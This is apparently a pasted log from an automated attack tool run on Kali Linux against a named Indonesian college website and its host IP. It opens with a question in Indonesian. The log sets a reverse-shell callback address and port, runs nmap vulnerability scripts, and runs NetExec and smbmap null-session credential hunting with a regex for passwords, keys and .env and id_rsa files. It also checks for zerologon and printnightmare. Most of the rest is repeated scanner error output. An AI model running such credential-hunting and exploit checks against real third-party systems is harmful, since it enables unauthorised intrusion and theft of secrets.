@@ -1,0 +1,863 @@
+kalau begini gimana ?? ━━━━━━━━━━━┳━━━━━━━━━━━━━━┓
+┃ Interface ┃ IP Address   ┃
+┡━━━━━━━━━━━╇━━━━━━━━━━━━━━┩
+│ eth0      │ 192.168.5.26 │
+│ docker0   │ 172.17.0.1   │
+└───────────┴──────────────┘
+
+  Pilihan [1/2]: 2
+  Mengambil IP publik... 202.180.25.41
+
+  Masukkan IP yang bisa di-reach oleh target:
+  (IP Publik, IP VPN/tun0, IP reverse proxy, dll)
+  Contoh IP publik terdeteksi: 202.180.25.41
+  LHOST → 202.180.25.41
+  ✔ LHOST = 202.180.25.41
+
+Target: https://stikes.gunungsari.id  type=url  host=stikes.gunungsari.id  ip=109.106.253.10
+LHOST: 202.180.25.41  LPORT: 4444  CVE map: 188 entries
+
+Results: /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712
+
+Nuclei templates: 12,669 templates ready (1d old)
+───────────────────────────────────────────────────────────────────────────────────────────────────── Phase 0 — Port Scanning (nmap) ──────────────────────────────────────────────────────────────────────────────────────────────────────
+[        NMAP] → /usr/bin/nmap -sV -sC -O --open -T4 ...
+[        NMAP] # Nmap 7.98 scan initiated Sat Feb 21 22:28:18 2026 as: /usr/lib/nmap/nmap -sV -sC -O --open -T4 -Pn --version-intensity 7 -p 
+21,25,80,110,143,443,465,587,993,995,2077,2078,2079,2080,2082,2083,2086,2087,2095,2096,3306,65002 --script 
+smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-security-mode,smb2-security-mode,smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-enum-sessions,smb-os-discovery,ldap-rootdse,ldap-search,rd
+p-vuln-ms12-020,rdp-enum-encryption,ssl-heartbleed,ssl-poodle,ssl-cert,ssl-enum-ciphers,ssl-dh-params,http-auth-finder,http-title,http-methods,http-shellshock,http-robots.txt,http-server-header,http-open-redirect,http-php-version,ftp-a
+non,ftp-vuln-cve2010-4221,snmp-info,snmp-interfaces,snmp-brute,vnc-info,vnc-brute,mysql-info,mysql-empty-password,mysql-databases,ms-sql-info,ms-sql-empty-password,ms-sql-config,oracle-tns-version,redis-info,mongodb-info,mongodb-databa
+ses,ssh-auth-methods,ssh-hostkey,banner,finger,rpcinfo,nfs-ls,nfs-showmount -oG - --reason --script-timeout 20s --min-parallelism 10 --max-retries 2 --host-timeout 45m stikes.gunungsari.id
+[        NMAP] Host: 109.106.253.10 (srv131.niagahoster.com)    Status: Up
+[        NMAP] Host: 109.106.253.10 (srv131.niagahoster.com)    Ports: 21/open/tcp//ftp//Pure-FTPd/, 25/open/tcp//smtp?///, 80/open/tcp//http//LiteSpeed httpd/, 110/open/tcp//pop3//Dovecot pop3d/, 143/open/tcp//imap//Dovecot imapd/, 
+443/open/tcp//ssl|http//LiteSpeed httpd/, 465/open/tcp//ssl|smtp//Exim smtpd 4.99.1/, 587/open/tcp//smtp//Exim smtpd 4.99.1/, 993/open/tcp//ssl|imap//Dovecot imapd/, 995/open/tcp//ssl|pop3//Dovecot pop3d/, 2077/open/tcp//webdav///, 
+2078/open/tcp//ssl|http//cPanel httpd (unauthorized)/, 2079/open/tcp//http//cPanel httpd (unauthorized)/, 2080/open/tcp//ssl|http//cPanel httpd (unauthorized)/, 2082/open/tcp//infowave?///, 2083/open/tcp//ssl|radsec?///, 
+2086/open/tcp//gnunet?///, 2087/open/tcp//ssl|eli?///, 2095/open/tcp//nbx-ser?///, 2096/open/tcp//ssl|nbx-dir?///, 3306/open/tcp//mysql//MariaDB 5.5.5-10.11.15/, 65002/open/tcp//ssh//OpenSSH 8.0 (protocol 2.0)/        Seq Index: 258  
+IP ID Seq: All zeros
+[        NMAP] # Nmap done at Sat Feb 21 22:32:12 2026 -- 1 IP address (1 host up) scanned in 233.33 seconds
+
+  [FEED] amass/nmap → 1 hosts discovered
+           · 109.106.253.10
+  [FEED] httpx      → 2 live URLs
+           · http://109.106.253.10
+           · https://109.106.253.10
+
+──────────────────────────────────────────────────────────────────────────────────────────────── Phase 1 — Reconnaissance (amass + httpx) ─────────────────────────────────────────────────────────────────────────────────────────────────
+[       AMASS] → /usr/bin/amass enum -passive -active -brute -d ...
+[       HTTPX] → /usr/bin/httpx -u https://stikes.gunungsari.id -title -sc -td ...
+[       HTTPX] Usage: httpx [OPTIONS] URL
+[       HTTPX] 
+[       HTTPX] Error: No such option: -u
+[       AMASS] 
+[       AMASS]         .+++:.            :                             .+++.
+[       AMASS]       +W@@@@@@8        &+W@#               o8W8:      +W@@@@@@#.   oW@@@W#+
+[       AMASS]      &@#+   .o@##.    .@@@o@W.o@@o       :@@#&W8o    .@#:  .:oW+  .@#+++&#&
+[       AMASS]     +@&        &@&     #@8 +@W@&8@+     :@W.   +@8   +@:          .@8
+[       AMASS]     8@          @@     8@o  8@8  WW    .@W      W@+  .@W.          o@#:
+[       AMASS]     WW          &@o    &@:  o@+  o@+   #@.      8@o   +W@#+.        +W@8:
+[       AMASS]     #@          :@W    &@+  &@+   @8  :@o       o@o     oW@@W+        oW@8
+[       AMASS]     o@+          @@&   &@+  &@+   #@  &@.      .W@W       .+#@&         o@W.
+[       AMASS]      WW         +@W@8. &@+  :&    o@+ #@      :@W&@&         &@:  ..     :@o
+[       AMASS]      :@W:      o@# +Wo &@+        :W: +@W&o++o@W. &@&  8@#o+&@W.  #@:    o@+
+[       AMASS]       :W@@WWWW@@8       +              :&W@@@@&    &W  .o#@@W&.   :W@WWW@@&
+[       AMASS]         +o&&&&+.                                                    +oooo.
+[       AMASS] 
+[       AMASS]                                                                       v5.0.0
+[       AMASS]                                            OWASP Amass Project - @owaspamass
+[       AMASS]                          In-depth Attack Surface Mapping and Asset Discovery
+[       AMASS] 
+[       AMASS] 
+[       AMASS] Usage: amass enum [options] -d DOMAIN
+[       AMASS] 
+[       AMASS] Use the -h or --help flag to see the flags and default values
+[       AMASS] 
+[       AMASS] The Amass Discord server can be found here: https://discord.gg/ANTyEDUXt5
+[       AMASS] 
+[       AMASS] flag provided but not defined: -ip
+
+  [FEED] amass/nmap → 1 hosts discovered
+           · v5.0.0
+  [FEED] httpx      → 2 live URLs
+           · http://109.106.253.10
+           · https://109.106.253.10
+
+──────────────────────────────────────────────────────────────────────────────────────────────────── Phase 2 — Scanning & Enumeration ─────────────────────────────────────────────────────────────────────────────────────────────────────
+[     NETEXEC] → bash -c echo ''; echo '=== NetExec: Phase A — SMB Enumeration ==='; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' --shares --users --groups --pass-pol 2>&1; /usr/bin/nxc smb 
+/tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' --rid-brute 5000 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' --sessions 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' --loggedon-users 2>&1; 
+/usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' --disks 2>&1; echo ''; echo '=== NetExec: Phase B — LDAP / Active Directory ==='; /usr/bin/nxc ldap /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' --trusted-for-delegation 
+--password-not-required --admin-count --get-sid --gmsa 2>&1; echo ''; echo '=== NetExec: Phase C — Credential Hunting (GPP/Registry/Spider) ==='; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M gpp_password 2>&1; 
+/usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M gpp_autologin 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M reg-winlogon 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M 
+user-desc 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M spider_plus 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M enum_dns 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p 
+'' -M ioxidresolver 2>&1; echo ''; echo '=== NetExec: Phase D — Vulnerability Checks ==='; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M ms17-010 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M 
+zerologon 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M printnightmare 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M petitpotam 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u 
+'' -p '' -M dfscoerce 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M shadowcoerce 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M printerbug 2>&1; /usr/bin/nxc smb 
+/tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M webdav 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M nopac 2>&1; /usr/bin/nxc smb /tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M spooler 2>&1; /usr/bin/nxc smb 
+/tmp/crushgear_nxc_qk9k6v9d.txt -u '' -p '' -M enum_av 2>&1
+[      SMBMAP] → bash -c while IFS= read -r h; do   echo '';   echo '=== smbmap: '"$h"' ===';   /usr/bin/smbmap -u '' -p '' -H "$h" -R --depth 8 -A 
+'.*\.xml|.*\.config|.*\.conf|.*\.ini|.*\.env|.*\.bak|.*password.*|.*passwd.*|.*secret.*|.*credential.*|.*\.kdbx|.*\.key|.*\.pem|.*\.pfx|.*\.p12|.*id_rsa.*|.*\.rdp|.*unattend.*|.*sysprep.*|.*Groups\.xml|.*datasources.*|.*\.sql|.*\.ps1|.
+*\.bat|.*\.sh' -q 2>&1;   echo ''; done < /tmp/crushgear_smb_53h4gbnq.txt
+[      NUCLEI] → /usr/bin/nuclei -list /tmp/crushgear_nuclei_uz46scu1.txt -t /root/nuclei-templates -tags ...
+[ FEROXBUSTER] → /home/kali/Documents/crush-gear/bin/feroxbuster --input-file /tmp/crushgear_ferox_i0a27bgb.txt -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt --no-state ...
+[     NETEXEC] 
+[     NETEXEC] === NetExec: Phase A — SMB Enumeration ===
+[      SMBMAP] 
+[      SMBMAP] === smbmap: v5.0.0 ===
+[ FEROXBUSTER] error: unexpected argument '--input-file' found
+[ FEROXBUSTER] 
+[ FEROXBUSTER]   tip: a similar argument exists: '--dont-filter'
+[ FEROXBUSTER] 
+[ FEROXBUSTER] Usage: feroxbuster --dont-filter
+[ FEROXBUSTER] 
+[ FEROXBUSTER] For more information, try '--help'.
+[      SMBMAP] usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD |
+[      SMBMAP]               --prompt] [-k] [--no-pass] [--dc-ip IP or Host] [-s SHARE]
+[      SMBMAP]               [-d DOMAIN] [-P PORT] [-v] [--signing] [--admin] [--no-banner]
+[      SMBMAP]               [--no-color] [--no-update] [--timeout SCAN_TIMEOUT] [-x COMMAND]
+[      SMBMAP]               [--mode CMDMODE] [-L | -r [PATH]] [-g FILE | --csv FILE]
+[      SMBMAP]               [--dir-only] [--no-write-check] [-q] [--depth DEPTH]
+[      SMBMAP]               [--exclude SHARE [SHARE ...]] [-A PATTERN] [-F PATTERN]
+[      SMBMAP]               [--search-path PATH] [--search-timeout TIMEOUT]
+[      SMBMAP]               [--download PATH] [--upload SRC DST] [--delete PATH TO FILE]
+[      SMBMAP]               [--skip]
+[      SMBMAP] smbmap: error: unrecognized arguments: -R
+[      SMBMAP] 
+[     NETEXEC] usage: nxc [-h] [--version] [-t THREADS] [--timeout TIMEOUT]
+[     NETEXEC]            [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose |
+[     NETEXEC]            --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
+[     NETEXEC]            [--dns-timeout DNS_TIMEOUT]
+[     NETEXEC]            {rdp,mssql,winrm,vnc,nfs,smb,ldap,ftp,ssh,wmi} ...
+[     NETEXEC] nxc: error: unrecognized arguments: --sessions
+[     NETEXEC] 
+[     NETEXEC] === NetExec: Phase B — LDAP / Active Directory ===
+[     NETEXEC] 
+[     NETEXEC] === NetExec: Phase C — Credential Hunting (GPP/Registry/Spider) ===
+[     NETEXEC] [-] Module USER-DESC is not supported for protocol smb
+[     NETEXEC] 
+[     NETEXEC] === NetExec: Phase D — Vulnerability Checks ===
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:57 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:57 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:32:59 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:32:59 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
